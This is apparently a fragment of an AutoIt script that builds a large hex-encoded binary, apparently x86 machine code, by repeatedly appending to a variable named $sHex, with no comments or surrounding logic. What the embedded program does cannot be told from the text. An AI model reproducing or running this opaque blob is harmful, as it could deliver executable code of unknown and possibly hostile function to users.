    $sHex &= "8B1398C457FC646D56FC0AF8CCD00CF6C24C74C1FAEDE1FFFF044A83FA3F76036A3F5A8B4B043B4B087542BB0280282083FF7FD7731948D3EB8D4C0204F7D3215CB844FE09752300E5DDC7FE2119EB1C8D4AE0339CB8C460380601163C6059042C534C5B0428FB99D64CFCD25A22550A5208892E1FD800032C02EB5DF883E300AFC0A40154548F8E2BFE9DB0DB1422C1FB04347A4B5E3BDE76028BDE887F5FD68EF86B7C3BD622D63BDA745EB96C0A9ECE7166713BBEFB0DFEE0BF178BCBD3EEF7D621745E4C030475212931EFE0BB00FE8D4BE02FB45B35EC05CF94067E8B5E4904894E17889F32CD040870EB030F6C225C10837DF43CDE0F84207BD6CE6F5AF08D0CD18B59485E0A5A4E0A3F6C0ACC08104E608A28884D0F0CED1DEEFEC188108925807D0F7E0E9487F7191EAD6AE8091917BBDAE17BC1444E0918EB294910AC4B78F0E5D9C61EBAEA8D846F09C3ED1BE0028A06894430FC10F0FF0866212A7142F3FEA430CCBD5E3FCCD8AB2CCEA8AFBFC930B45AC1E10F03480CBBDFBF6F2F7B5351FFD63F65B70950081D8B40EC61DDB3103983A488D9002BFE484315FD2E12FC48108079434E326004FE238378F6EC33569E7565C2700CB425123CA2C1A910A1CD0830FA3B36FA8B15DF2BC87811EC518D481451BF229C7651037C7C52FF553B05014F377457767A6D08143B0A8670EFAE2442A32FD2445BE0806E0168C9C33928A469D3C538C4D8F0753466106BB8023DA06C50699FD023DD5FCD14041A7883056B10A30AFC994FF9F65F68C44126E1E6C0A0080B4610C76A04495FABA6942068315733FC5D15D89F84A412FF7610CD889B834EADAD71978276897E0420C48B82839A99106C208BC660115110C00ABE890853707174D85F7D35EEC603C043C8F98BC369C08B843008ED1F29FE45F85A8940080404F3542CB80A4A75F4088BFBA210E7DC6B8172790C6819CD83C8FF377DFD66C032ED8D970070085550FA774307FEFF1DC62BCFC1E90C8D4710418348F8FF8388EC127725DEF78D90FC0C89100EEFCC40FCF01D0A71DD7D5004C780E8101905CEF8CBF4077FA874D0F805F8208D4F0C894829389140D4722A102C41BEC70BBC649E440068BC9E5F8A46438AC83EFE178BF084C054884E437503097804C55002C7AF24EAF7D221CCC49E0F17C0619B0C1110753EC08B65EA8BD72B51A217C1EAB4000B69CA724FFC682F8C3BA0493BF1D48B1F2210EF00DF159C0F8E553AF6C3CC45100319F0D7FDD93BF30F8F3B12F4C1F90406C0D77475B6F9CC0659148B5FA766A429BE5F43F91ACFA4722940F8C00190269002AC7D1F83C1E039C6906868EEBD4F089A8911047F16790A76D98FB22BCE01EC5AFC002CA5ADFDCBAC11129CC1FF044F88312EFF4A7CF300DD5FF48D1CFB"
    $sHex &= "89D4A6AB99BD5B7F100A7E4B8A599EA6699A4B59595707132A4DD35407FF1C13CF6D025740786622EB200E2EA4EB37784F84690E4F84EA2CCFBC32390A4CD46C327AE6B2FCF6A41FCDFE228D460189422028F87C35CBAF02876F4B35CE0F8D2F8E9629B24E077E716B424B6C5C33FC52C1FE044E7A0478293020A4FE5EF6244C69072C00383CFC316738F021383B4FA1FE38300C9BCE7406DF0EA1B00143E54E06D9DA035A0774DF77D977104FDE3198B5831203DA890AE1F3C30EDF4E8D0CF18B7995897BBF4B0415784884B3AC063997954BC306ACFE0FCEBFEFC1A95C2A39CE0F32971CC3B53979AD4E45E8880D1588038018FC9803DC03ACC17B186C24A4C2B7C40305F1C11783E1F040F86E3D7A3A5349065657CCCEFFD3EE8315EC3FEED6FFEB0DEC83CAFF33F6AA4C822E3CC00DEFD92E539057BC1BDB3B232223FE9A0A83C31400083BD8829D12DB72E806757F56B04719D4F4E7D9D9755BEBAC7BC65B3B79A673F031093763E35E81A7F01528313A8BD82230EC1E2A5F38B3532BEA599AD77D012EDC018B43AC38FF74E58989241AF0C3EDD78B10E483FA24148B8C438B7CE11B37D88C234D1FCF7529968B662D68987148B8394F6A56EB3600FA91842C4AEBE75D7655BDDAF34C8EC823BC01BFEDCE7512B1A86A205F6EC94785C928C40DCF44549C8B0A2BEEF143795CED1DDC7E23624E4D47A301914A024A5C961A4E558F1B7DD0CF51D92F78747238E6CEEC235C88448906F42A3417280F7533ECF0210BEB2C2873C2EC7A4D8C255BE078F799604862750B485421BAA6E9BAB951F8CE307A791D0D539A4A7AFECCBCF3B414334089510A088DCC44172F5E330B2AFAB0051B397D23440B00C2F520F88A7E6AEF093B49FC097C5088A6E8BD68440D4109E4E0CB451B55BC8841BEEE09374ED51D1A90C00B890AE811AEB3BAE91C7CF003D1AF241ADFD89A6F1AF48B0E8D793E4C751AF408F082118730DCD61FAF81BDE100CC248A700837E1E88D4204C918392064AD42019CF60044FC6C068DA297443F2BE053AA2531334C89BFB833C5508965E8FFA8168B66DD1721AC8D45F064A36FC3A2128A749F50A600595FAA0451BA43AB803F7D531DFADDFF06568B73083335AF578B06C645FFD6F49578518301D17B12F8FE740D02038E0091FECF330C38E8A7C600F8088017E1CC1F9724F6400466167C05BE97568D55E88953EE5B0CD868AD091A104DC4FB805FC3765DB0AE8D04044C8614028610301E1D1DAC9A000870A2D7F26362C9849BF5E801EA407F47268A0A149F38EA75CE061074FE067C3999080524563AE8141B0C26B8F4C3C370E3EBC90E71FA5F34813963736DE040AC14038B9EDB9420680FDC6456C404A742A31A15553652CE2E5683816024421992D33DC3EFC439"
    $sHex &= "580C74126823D38BC82DACC8A1E08BBC89480C2591C54EF0C04D811FC64808BB79BABB5DD12D3939530C605210ADCBA917FEE2D5FA39C41757BFE803EBEDDE8975545E11310081C72A0AFF25D006CD60EA7769DE5F675B163A0B854E87015B48B95E07A2A09DFFD05EF6A971D524DC9B7E156EA54FEA1DCCC984DED5F461CFB6D0559D3B0159FF04CC6A08A71B782FC5C311AFF0EB30D36BA40B2B02D6C6D4606B608304BCFD4845A5AC13200F3A3A0ECC1741BEB446D10C72EC2A07275DB8CD78D819680F2B760D7EC8B60AF3246A66575BA8A7CA0E750998AC3B73423E54DE9FDD5FB73D40B890C704244094568EB98B5ED910E4741B6811AF0C70CEAA04F802492A81F23449363A1870C7D0EA0F089433DB43394B64D6FBEE032B8917608A4510A20E5C679C50E8A200102E0D956ED24308E134897DD892AA02265F78290444DCEFFEDE4CE60AE083EE04163BF7725735B7390674DA3F7BBFED184AFF36537A2B8906FFD7A90B58ACD92A9996730177FFB2053945E0740EA6DCECC3E56187ED8B14EB9F3FB0B806AC4D5A2ADD591FB8B4C93CD820383D33843A7528AD64DDE08A50A5ED2CF63D74433A358A08D7D580ECD9C7D901513C1CB91C24001F2038382A4E912C76DFAE15D39F0B61FE17D60B68E37159D95DD41766C25FD9B10DA3AD7B9C3D4C77458E24A39170D40142A13A08FC08F5FB25A8FC3B1CFD38A8740996BBC6EF4AEA1772EE080F8377A4037EB50A17F06C7F59306E3421426F8F8F5C0D2703B0301B3C08637DEEFBE04DEEC3A73F4E3798BB14C053BF1E68576721B83F81170B0D56018A84F75E2368045CBE4681CEC6DDF77417E0098500415475268F80755C6BC268FBB656830FCC50FBE02ECC0187376B8C40463C7638191128B823323B03C654B97867F7AE627C897C2BC8515F6ACF84113D854120F20DF6104036D84F7853556A5B576C4F391C11A2AC496867D72984105093504768F2FA0B70F0EB326AF4A56AD83BDE742483FBF7912028A21FD8B88D34FD9FBFDA82236168595010537F4470ADC1085BF7BACAE1936BEF1F751668E5384ABD75D71259BBA3223BED32FD2D850B7C0980CB013A0F592F981CEC5B145D6D84003BE10A8F3533C55C7102361C83A564AC6A4C8D9750E004638E5003E0DCDE991A2F898528FD0A8D8530959576DAF21C2C0AE08DDC959F959595D89DD4B5D0BDCC668C979797DF95F80D8DEC9DC885C4A502CE9F97C0ADBC9C8F85F0DA0A78AFFA8D4D04C7D3DAC8E8074FDB5DF43749FC10E4C729A71DAC8017F0595000284EAB80E4D1F22217387805BB8D717954011587E4C4B0DBBC02DF85858C17A833CD5BE8F17EC835B4BE66C9BD84035DFFE0DC018FC37D5DE937B54B31057025A4896A21DD5A5EC8FF4C05CE2CA669BF3C"
    $sHex &= "90DB895DC804D4E4C2AD669ADCD8C00749143A06E86D0B74A8E437340A27F73BC32DDC354A2E03C84ED8877803345FB06D51CCAF0C3483CF1A7D3B60C4BCA36C0B60CFB4EF7F65052A6CCAC43BF3747C381E7478A1563828DC50789421EB232C59017098E961493307504BF60370D575501559A33DECF4745A561DA92A3AA70BD71DB82E033F040CDB1C044FE94389BB0DAE2E3E98693868328801684134A32E74C27B410C5CD994823634A16BC03CBFD48FD010663A0BCE740EDC0BDC6BD2FFE93EEC3C03C22D0C22741AB93011894DDC2B0536A4B87B456FD8EB062188D05008DD8B9A2C3F30E0FF3057E78C9DEE0474E6CC8B4CFFD7E539AFCDFEF75DD0750A3E8B0088583FEB0713186F7004A5F229DD6AFF73E067100BC1E8B76E400469081518C745D49B692AED23BD41550EDC33D8ED11E150444C3744128AD4DA773D11118A566A408B7DD43742B33003191047A589AE9264803E2DFAC2C849F8D64246C3805969C010D1FFFF838E208A063C2B74083C307C153C397F1146EBEF346D8423458BF417B0763ADDC043D87538694201B00516A4FB7D52074670307DF53F1839163515844EC874F7C40FBE3F781019A85CD82361FF7704D80672055D147E8B47B7F054701E04E475802560A60715CC129D07C210030C067053AF853F482DF08BC711252A84FF00BE8079054883C8FC7AF41740BFA9F4306A64995BF7FBCC1F8D8770878B886CFE99BB901423A243F8C538C6C1E0028BB096C09FAD1D534E198C740C582B018D5FD4306CDFFFBF5FFF8E5F463020CDA46606E61A8B3CF02BDBE114FED08BDA8D47FF997EBEC1F87AF11B9E7AD769D26D10ECC38D8402259CFF0D154E64F9CE1478072BC20345183B5518D4822FD47F0602F9EB0203F082140507C1023871C6591D0FDA63247040803AC4EB04EFF8B00915903BF07E3CEE07EB3FF16D24070B911B7A342AE0D983B5E307118C0375FEED8CBF4D404D200B2469C99810281DF4FA05280801751489353A46B7208E745268EB6B2A2FAA42AECB7074DF9BDDCE6142CCD69D01054F79AF7BF7DF12810F005C2605FF7370EB19B819392DD601DEEF7C0C290FFF05B53901B66FA06156F033F6F475FCF94B365421633932F889E8985B48765714433B1544D7673067260F6C641887685E1F04355F16B8C8B7B7D9A7BD05182E0C0D28501D2C0F2AFDDBD9DF5066572075152124563326505253EB0CB7D1C8871756565256229944ACAB3B53E2E50BDA0BD4626D0BD80F7D9B7D76D6B10BCC751721D0B10BD250B3BBAD354214B40E1BB41EB90BE3A67FCBCE569CEB5483FA6B9E586A02FBF704166EF40B67F87D136A04588BCB20E0C3D9CE0A0CF8053F51E939F4AE5853547B0E274ABDAD3328D3562FAA48E27FC30E17D6A1FB3BC8"
    $sHex &= "7E1C7D163BD17C220889CDF63BD07F1E0E7E1E7D1A006C9B4D04F0227CF67FF20E7E0829D511D07DAEE872293A95C3CC7E7E0B07EBDEC2206C36750D149D680F9DC10BDAB199C6194E9CC11F2E4FB87CB46A0828B0F6D33CB82D9EF0752A6A0615CC250B31E01E0F0E662C1815406466E048C111060C79A0D797D05B063889CF21F01846A31918489B1C490281E2332EB4CD34579BF78C843B4679570179E560244E4B4A77459800A370C774CBF66EF101CC32C2D6107F167CC4437E233C4057FFFF730CEBBCF8FFDB8F720A7FED34CF26419377E55357688033E101505175809F89FD83C1468D810FB082015E7D8D790E2CF8AA6045A89CFECA1A00851D74CA93A42B1CDEE22EE147118D4403EF108D41BAF67FAB2AE6521D6D7C2BC71BD36A00BB805192DD2C19B6532530F81155F42450117BFD7F4D863C6EB006BFB481C70B832E72C881E1DF2524BCB386B84983C9FC415E9DBF14A0B459F7F9BA0805DBDD2DBFB9B9274103FB6FEB323607C9B0B079730A0758B81116344634263824FEF475F48946140DC214C10241C31C9932AECC6F69ED3EA062B2BA0875050DC48B6F86EF8248143942047D0D360E1C8A7CFA46C0FE07D949894E102B048AA86269B60A173E5332FF30B1071376D96AD85999FC4C536822E4E690BFEA5789561808F0F1FF913DF71B53ED6A3C4B4540D91330BDA22B1A5E20893E06BC6814C226199E3BC6751D1C833F5DD9DDC70016BA79137FBA22FE58EB0ADD7C89084432155B7C71805C3E773278B8FB0B8078B7B062ADA408FFB012BF59260CB8140BC07D144777CFF017FA10F7D8F7DA83D89626891C36ED9964901C181C182E7546EF1A891858187F33D2F7F1624C773FB54C0ED3EB41163354FA33FCEF27D1EBD1D9D1EAD1D80BDBB43EF0F76424EFDF6F37FA32A4E603D1720E3B4E770872073B5676377334D9014E98F64F60D8E083DA005613BC00205FC210005F536AEE2443E0A1250C10891CCF14B8E7A53613F15B1814EDE0E03C1B1F5B0E0C811D7C7B0AC2164F794EEB536138E5BCCF45300C61C8189108140D3F3B175B100E5076082B1A1421B0E79D1B0E0C109A71893E8AC15F5B6E7B8BF1C63EFEE3C54EF6756362540CF88B486C890EBFB087D008682E9872AB0874123721F81683AA24854870FE1A5B7F807977428906A8A9287416BFF3689AE43F08466FD62AF64070E03E5EF30275148302C8010E08B2C026A2133E39C60004002828895D630622E10F54B84D744D7E8B45100800015E118A74025AE27080D2142C0FB9CA8C0E6080F47408B1E24EB8286070FDFF50303904740CB889BE0BC4027CC90A247F50AC538A1E0FD6AE0DA88D7EB8B9ACC87E93591F8C17DC0FB66EC777DB49B777B846CAEE91C83E3005F891FE0FB7044283E0"
    $sHex &= "08B68A1F47EB32FB1971B7FF2D7506834D1802EB05142B750328BCAFA1CC02248C4BB34211B0B787F3240F8F39A02A50307409C74A55BEFF4F2AEB348A073C78740D3C58250821F9BE5BE510100A6C1075135C750E4B048FDBA0BB750447C5B11DB8FF0036FF6F0A0C9230CB0C4EF6C10474080FBECB83E9DBF7FFFD30EB1BF7C103DE74318ACB80E96180F9192E7703322083B6000FFEC1C93B4D147319680839C67227A401E1A9F73BCA76211C04CDACC6B8A77E184FA8087520AB038B7DBB50C70DC4EB5B2E0FAF5DA2D92FFA6DE024F58BBEFA7FA8044CA801753D8001050D2602808104C5421C6CC07709CA2BF6762641781315EDF6A0013E228AF4AB757F54FCFFEB0F22AE580F95C003C6B80B5BA8F0B062A6382F4A0C8A6B48FC816A04186CD8EB18473035CB263A9408D658108963E2E1EE649E0DE7C78F3AA6684A10EB0150304E05221613116904EA801DDF746B0C660FEFC0EBC8A4247467228E089051471009204AA552A9304050609A889B88701DD01741449CEE10AC76E5F7209A893C3CCF83E27FDA64700AE4D6682BCA1146C09E61505F7E308988CD302A0E4503508D406B0E2A76C0A6F840F374EF8F88AA522EF7DF83C7B0F02D08FF4C84D2F0026A1003C82BD0581E1186528EB250B6754C3C2C1D212D31F1E1CF480A3114FFD67C21A14E26EEDD850C741750392C88474233536E80A6EB27D801A80A7238F8F15304FCD36F3AA85906185341396437F80812EAF59640817A0C1959F22A19A0F5FC3824DBBEBE1165186BEF23026826DAFAF05C1B7C0D6CF2BE0C44411CD8C3496BE2112D16507F4C553A6BE2830DA73F140E257ED9FBFF31202F80A62C90C34C2E02E5F07D07C2BB124AC87AC7465C3C60CA91875F387E1498248B1D9974E0F0FFD38986FBCBEAB656B7D31FFC5470C686D1430C4B018F137F768A44A5006A0D97FF76091E27BE68E5249353812C142A7094411D746C7EED16781EA16016626C3A75DC59C1E013D7638AF13C5622B663BCBD7F1107C685719AB5D160703044BE1D46138BC1F8C34E2D71C160744A3A2518910106C34E2709489CC5DF33F6D331285F39F05B3A086701CF701033E380B686557B180976EA5EE20F84F85A4624C803722007D21A2C343C0772200740444818B378205C3D9521A00B78A01B8B7E68A41A8968F19785F6750F81FF63749F08C5A37355404BD14EF8EE79766C2351766B593B3DBF9FA208BB147FAA30703F6489745D6C1890934C6D7F56B85538037D1783495FAC047B25744BAD98AA9A929A2747136928149F563DC55E609531FD0504A954263D8F9914C0095AAB5D5F78190BA61DDC6D64F4AC545E0135F7E754576576AD9DD60F48574640193C1B98CBC8443448844286CB9DBD77D0274C74164430CFE06B"
    $sHex &= "BE0D114804DE24A1AB851DEC78771320C70571F036898F122C98EB7771A3852CE630D7125A5D501F2001BE8980BBF16D2B40C3B42FB1D941A31F9F441F3CA796CA4C48B0D961DBDC5A1345A8746568542AA1D53404B89BA3094897482043C8341B618FC69B164512144B6003CB1C65EFB099E21EFE04AA1627392350761F56CC491F08798D864329FDC00CC40378FA2075CA8BC7136C6C09E689E4C1C11C30DF927911E897E0B1854CC39323B4C00AB0C126292C395C749B1EC1915CC110357A2F3204D24DA310BD4436D58404547B40DD34D14F3E459CB538F36A01981D5676205EF55795EFF1C262EE69C81200B911F88D8811AA8B600AA230C640226DDB7C13D80C050A897808240006250A1C263314A63D38383454407D31E13E6E81C163BCCC66397DCE5E5D2FA8A00A01D0B7FF37D78162EB388D58403B98BE51A0C415FCFE7C028BFE1AE04C34E0FF58601F1B2C568B4DE08D0C8DC9831BFC1D01830521208D90232AF02D787B83602280602480251E3800BEDBFE43271103D63BC272D2FFC0393D7F7C9DEB068BA8AB0AF013CAE09CFF7E6DB8FE665F588B0883F9FFDA08FE74518A03A801AE78C0C34E6A0B5153D23CFD17000500E088F80583E61FC1E60603DC0A9C812625712E06608846049B50EC4DF58D4608F6AD5485FB06C94608F44383547500175B8EE07C930AF32BA1D3D783358106510B9A8D407BD10680E080EB72C69281A60545C1FFD06AF6A4C348F7D81BC08AF567D880F6310812FF5E43B63F57B5E1F0233734893E25B1B6776D34B98B6209100414CE06A782082B743722B44F677C81C7C7060134FB030F8C67FE8C4E7D17E1AF30EC11098F1DA9F751B461183CE0B3237BB2B75FFC7A318D871D1A837F0C740A8D47D6BF501C3C31A4B6C734C3F872E27D331DC6FF36B7040813007CBED9D84958A45F0C0082D992D84D7475E303A4C0FF90684818ED5BE73C3D740147A12B8084CBC0018A068499EB0B34EA6A044757B7F8D9B3839F7408441ECB8353EB4261BD0208FE8BD843803E3D594E10535B084BE3E156070C4E4EC02E183157760403F3700D6E82B72EB9FF9F7B2515D0279B916081000480636E595BA09BEC068C4B084415006BC687F078EBE48B64534EE15E005956EEFA550CC7016F6E6F6197E47409B20E048913D050353770D822EA34E3AFF914FCB3224624EB3CFF079A0885B69B003C024289728A1E6A046BD16B504629FD95133CC3D430BC20EAF846BFD4DFBDCC0C880146C0DC84DB74328875A980FBFEA6AED020749C09759FE6C642FF53347080CFB23CE90885BA809E201613CEF7AB2046EBF34EEBE331D0AEA000918340451C0134B8FD0ADE33C9EB024641445C74F95B262FA25B6408751FCD74D226A814DA803824042A0D8856141E"
    $sHex &= "0C068C8886D1E90544FB6DFC1249F9025CFC070CF1C1831706978674554708044FF1A2CD4B7447F0743D0FBE10582309067604C90D52BCB977CC52607AD3CE45033068DE8F7634A8465C5CCCD60700F78CAE736361102999BC5B573422A06A83202601EFA296C685A457950C07AFE34DC2D50C584488300DBC229E845CD1E238897EB0065ACF5432B6381875030411610092B40B98F78F4853538D7DF4E8D60162FD12E8A73D683F734AFAB6734234A000174AC1E702EE0F30360D98700D8F260A89FDD612297D03FE5756816081D5EC1008E33C1EB83478302A651A0D607F5697DC442F8148DC9A91E2687CC3752EFFD65222441DE3DAB842BBE1D9EE6E752A78500258A331EB0583A3612A89F8BE81B8FFA702B275CB5F888BC766391F740E40D01023B7400C1875F9F2D54C02B07F27B02BC753D1F840505712080F0A990872D82A2F6C201C124338AE36E28A64021292F44AE81247180AA6FCCB01264007C9FC8B44D077E01860EB5C7C448082250EAB09C34038E0847286DD3D6C10520A40D4FB09F62BC6C4C1EA9DE6D6CDF05C0C90E21EBC333C665EB7DE9C20D80EC69380318E83EE6ADD6D560879A0BE0957D2769B5BF8C6730F8B0781C7F4FE72F14E182195614BA8A81AABB1533DA5917E62F3664601565C8A6457BE2FB841F8CA5339394CD86BDB18C10C03DAB26F57499EEE6BC010C23BC8730834F02A957558CD805808821F4AE2201F613583FB05B0EDA6C008AC082101C4DE6B1A189F004E60E00E89103F01A82448B285B8F08C17722F96588B2E5CA1EB2F10D6F93BD77D246BC9187EC1954BBBB26439083C3D1D4203DF20AEC603FA3BD37CE2405A643D8ED83DBEC2803A09C7466483615E3D901FAE0C7265814E3D91843E3D9332C89541852E3D8D822A5706B91E3D8F860E3D9207550B4F788A2676F2FF59834D20B6F0EB07C9511863D4681BE41E4660C60BC4069C88B87E50750D5C0AEF611AB35FDA59590708B5113A2C8556031CE028EEAEF8B7A2CFBAFF5357BF4EE640BBBBCEBC0D851012033FC609F72CA004EB60CCE7588554EFA4FC335A17D2CCC9F7B033F00FD4344EF0B5CC2A35243C331822481F08F67707BE4FB2EB0B85F314A6100BF004F0FB563CF6F7D60F045E3A853FF0BC0011F4004F934D13F40D64FE107B608D789413F9454C18EB170AA9A02F073C33C93D1594C08717600F949404D0CC20F7817DE01F085F28D10258551F46F63F8019008D14065552445612A25044966304BC02782C3FC42E08648925F07B4C49BB30F85A2C3319ABBF6F044283FEFE743B863483FAFE1CDF45B4FFF2762E8D34768D5CB3A60BF0837B0400757D8CCEC4CC68EB43387C2DB948727FD816194CEBB0648F05ADEB5FD29314E6C39EF741040695D44A5AC02333"
    $sHex &= "ECF8F00B892E33C8E8DC9CFF3E681882689AD3BC041014491FBCB3B06270478C8902B8697FC57A141E4C2029FF711C0418177468AC28514855E2538BEAF105F103E233D24AFFD15BE00DC39D93EA8BF174F61C16CFDF443BC933D2E622483FD5E1416E2FABDC983AA1A87907545DCA6C5212748809519A76C1345F57508B3556B84D72663901FAF7160C3A17413C03C1813850458ADDAD5064EFC4B90B0139481874B14231F1C28BC25DDFAADBDCC0DB4862C80FB7413C0A7106667034767D578D44081880761B4E5F682CDEC63BF9720922E0FB720A428368E729FDC0283BD672E81D9C9FF99AE8716AFEA7805FA100511366A8509A4989A126CCF823896262436797136812F00010C3BA83CB63CC552E2D275033644DDF719A0C08164024C1E81F7E83B16A62C7E001E1AF820FD231E91F0194201D78427DF53860B5C025637D45A48B184EE392DE21F1DF96FC1F1AF81E272B8283C1DE2BDF8D43DECE5ABCE804727757A94F4E1E3EF87348B8C055FF27C773028BC703C7E0720F506CB424FEC957E15916107F20CF402A407431C1FB02BD8D6B75AC98D1565A317E6B101B89064256311D58E061043859508B910912E86A0445424DABA178EF54835B927A1858550FAA18B22678EC0CB7BC5A2AA0F63B44D7200F26EA651989663AC66B26BA534D2766042C3AD4F61406594827988DB7C304150A965E3605C718EE54C70370FF28565FA3C0BF831DC3E754AE4078E816F5D0EB5987418D07B39FFBED023C821F90667CF50D6887A052E90E6C09707478F13D30663FF764563950045A007D81A6F16BF60C0366C00C3715A153B8EC0403685E3BC1F24A4EDD73053D0269FA0D74313952C1562044E0ED7F8627B92EFB0B7F4C74158B3E02795E1380593A220608643E269EB07544E9E97514DF35F8374B68CEBE45A109EB60FF775C29C484C38BD36B489ABF7DDB4148EB5A9283E80F743C0806742B48741CD53073422516F557BAABA807AE937474EB16AA54AE74177070EB0A7878143898416F50876050B32494DC4201243613574D4A7507679DD5360F3D4816E4BA3873FB17714630FB08740A080B7405BD0ABB00DE8B4F9AD4894760E8EE9BF62E75401A64D0C747648C8C232EC1331057AB9411A857B0DB5D151D03CA39207D198B08C057A9893BF45C894411C8DCEBDB91B1A13B15AF68988B1F1C645386A1B140544AEB19AC6CA499184AC6C800A098085E373111AA42A969432B0614D064B375B0770423805D1D8C70204A235342197211AFB79B3D369086C28B81CB66AEDC393C7DC96775B594832A393057C1B8E1635F1401BF45CCCE12C0BDBE6E8C383C90CBC0290C9438F0404C34B99893A0EEC13EEB20FCD8572F9CA109627BA318564F064C74474AE47894A745A07849DEEA"
    $sHex &= "D0D7D4F6742CBC28B9119BA6FA198D4DF851B00AEC0150D2171A1B0306F6647509814D102B7BBA47FAEB39AF94309FE9DE01D0E72508FC101C3998BEF795E413FCFC3FF39040B653C72F10174164A00C2B0FEF7FA3F00E0C1E7A3BFB771B05A3B08218FDA321A60A31EBE01060BFF17F0708EBDA8BD0381A7404424F7554EE8ACCCCB4FF0E880A42463ACB740320F34C448D91EF0ED722A65CF1EBB5E75D88F79D8C53B9DB57395D149FAAC0B69BF40C7512431E112B810FEED5740C1EEBCAEE3BD34648207C15D18E92263A07FF750F8A0A88084042161E5E1DBAD6653C084F524D6EEE790202CC1D08404C8B676204F6EBEF2C6A50885C06FF580C6AEC987730C4261C825F165CD44D378E00248A012008155E87FE4E2172FF2D3360696D0D8B01BAFFFEFE7E802F80FE03D083F0FF33C286A900010181E644FB5D6A8B41FC723284E48CA9C49A5F007B585A0EB2EBCD8D41FF0E690570CB44C312FEFDC9149343FC774DCF2057C9CB3019D132C9C54B1E5EC31928B82507C1CF8FA0ED7F7CCE7C1E83F9027E0C0803757803AC143A15DEEB280D30191B6818B020B9BC2847A1D265EA000031B03364D9E763572E356183DD39214C74637FB9E64A46BDF4944366408F3A7CBD5DD4A57D462750155C5F806ED8761C06803C383DDA222F7512341C7F9F57D63315043692D34F573CC26F168D443801EBF499C8066C3B05E5955B0969108B155170750589479804F44D8AAE50E88B4C5EC80A4209B02EA1E21EFEE12C530A9997D0515D08A913FFC72FE1E103D3622DA41C742283E8047417B33B4B6F080D740C4809B804042C0A05A5F24E121608115570866B0E441D1C46154B17C61C57C7E0B7B8696EA8E8C14C04080CC1E1E008B42F08C18D7E10AB00B9827101BADFC4582BCEBF718ACE8810403C9F975E8EF78D861DEF27084EE41D86C0F4BB1C058D17C6BF53578D85E8FA107604233CC0ED2154BF6F6CFBA17B213E708884050440F0F48A85EE5406F0A3EEC6852120742E8D9DEFEE8BBEF575C804033BC877162240508D940D3F66FDE0E06A20528544438A0343CCBDD38EA5D8900CDCFCDA50E13B1ADDF25150F85485F4C79A776AC02E2AFD573D5720B7E67B68539483F54441FCE19A03386800CE4924FDEF94DB6B8C45CDAC740E804C061D108A8C053EA572DBADEB11240274152090888C83EF07C116D208C6841100D59F78CF70BEEB568BC785E48E9FF8C9AF7277BF29178B950B8D840E3DA68D5A2083ADE39FF6FB19770CCA0ED180C220EBE4FA200E6F577C2A20EA2002EB03C656413BCF723C328A8CC28E5F902890A7115BE2A37C00BBF8A1C03BFE47094770741D837F6C82178B7768E00993D6CB207753F8B766BF448975E43B35A619F8D4BD36541A56D5FEEFBDBB5C"
    $sHex &= "56A1498947688B5B6C56267E3108517071EB8ED79A88A7B6C1DDC48E702BEB538D4F4D7E89C2A4777A6A85C2751E39A491DBEF80FE5C385DFC7445B8836170FDEB3C44FD7504D3BE901258EBDB2CFCE14E33AD60C439EBC47671129543BCF8C6A5C40A5AD1205FC676090D56F0537AA4F689C75043BB2C3BFE3AD06D01186CA8DFE972CCB052AEE8A000B8C6309091F31B05BF571CC0303DF01472E781CEFD712ECD3C707016E964D4E813D06CC73D60FF522ADDE8919C45E800255433E8557F75498D431C5645D24284FEDFD0C48E730C3955E80F86F8E37FE0F573EEA4CF0475EF8A0E84C983A7A627094A4658C943807EBE58778D8B4DE46BC930811F1C6CC88DB16E4084EB2A8A46BF1FB6F6B828683E04C0EB64E08A80382C0844003BF5DF3B1D9A01473BF876EA424646860B587CC2D16E440FFE3A214C84048072E98BC734C743DD7E078708C141B06A0689430CEE108D8983EFFFFF8E345A668B31416689304140404A75F38BF3446E433EF4DD74D171287C031D0414C176F6B67EFF06B7470756343E701EB9FEC1D4D2BDFF0808404975F98B4304A9A46AC0023488CA0608658A055626537BEBA8A8C6C9810302630885BAECD4075E09238D149A7CA262D397204DE0FF11AEDCE1627107378B5F68DEDD59A9B006F03BE20C572002D6DAFA96454889DFC97E69B988061D8BFBF3A58323D6C9FA0D4071F65954888C911E4E665C8B71DA253F423E4668E38546A63D47895E68A72DD8A9CC3D2BFFD7FA70026CEA320580D5F60533C6DD7609C160FD24FEB40ED6A8349508B80CBC480643C32BA8F8057D10C84CE0CAFF1EDFDF0C452CA840EBE8333D017D0D8A4C181C88880065A46DB4A72030E900D566E7756218C337A828E6FF63115C1DC16D1393719FAA02771D27EAD79B743CEB30FB1A785495EB25A02081FB6BE0142832537FEB0402B91E6392CAC90D81DF37A3126AFD2072DB59590CE89E4A2C878B86BC25DBA735079F7A6F24AC6826B023AD0278205ED65A1AB8175EB8133C135DFFB66B3E881033A7906640B487CB1891CA89399F711E21C099D1D39E44401AC42D4587D806C46920CC2D2BC72584206D6DD01B98C05F428F8B268DBED44307CE40B757BE071698B454750F8636FF37E78D3F3E56C37E50C20816817FF82A28740EC539B01164040B17395FC58C46019612502D52E00B886AFF4D0875C71D001E03331935E50083DD58DEB08B87DD9001E9BECA5019B8B472042719C08D5F2D7BD408BC3D098B0337837BB60A9E77306C541FC30F80D405C82005E7A52A1D0D820B8E3AA264352C2D862A35A2D2C766EA1AE45668374E3ED7C21712CC74285789386594A7B008E21B564161F9088DA859E5AA308202684E30765EC8F9974966D740F046707422837E0C30"
    $sHex &= "E1AC1C2D706CE10C0963E1878D466C8B130A1F18F54E04F177ACEBC1082C0576BF1AB54ED8314014B84DE87B6EBCBA49728D4301CD77E6287D47E2E88B808DB70458EB750A3DD0D096C1F208EE24C69E7AD125FF91893CD7128AF682FF0DEE028845F8885DF9C645FAD8EB0A33C916B118BA9BF8F9004192AC7014842E0D8374F4511539A233DD2750BBBA20F2457C20883845F44EF073186FF6EB14EC5623450C80B82EB74C30CD4D61F23F6EE2015C560A4E2606699A28100C08676862FC0E8BC3FC2EC8520F7867DE7B03D1EB47165C525447D1E9D1DB954AD39B6FC9F3141013BFCD200C0F3B5676094E3CCFD5540410149C12080C2B924E4D138BCA7ED9CF5AA630A35EC09D60C12F06043062CF762E6AE05837A9A6BEA03B9E1BC040751F59C20239131D11142BA9F7497A290FAF90F189D60A320500CC0385F501C0E2DC776939162100704B4318C00300374EC437E467A5020FF935D3F1B9B60F7A0D8B8E3BDF283C5753E0A26E9B0B207561566F09003CC386284C9D202B609233721B3C48709D7950148566794D0180C060721814D9EF85297C0D4F740647167E205CA3B54D263BCB762874AC951B2E33D25810735DC369C83C2B6529EB412204102DD01010F1390A6A5868C209B97C4FBE567219F8